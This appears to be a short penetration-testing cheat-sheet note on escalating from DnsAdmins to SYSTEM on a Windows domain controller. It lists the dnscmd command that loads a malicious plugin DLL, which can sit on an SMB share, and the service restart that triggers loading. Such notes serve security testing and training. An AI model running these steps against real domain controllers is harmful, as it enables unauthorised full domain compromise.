## DNS Admin PrivEsc

- The DNS service on a DC usually runs with `SYSTEM` permissions.
- DNS Admins can configure the DNS service with "plugin" DLLs.
- If you have compromised a DNS admin, you can add a malicious DLL as a plugin, restart the DNS service, and Bob's your uncle.
- Commands:
  - `dnscmd.exe . /config /serverlevelplugindll [location]`
    - `location` can be an SMB share
  - `sc.exe stop dns`
  - `sc.exe start dns`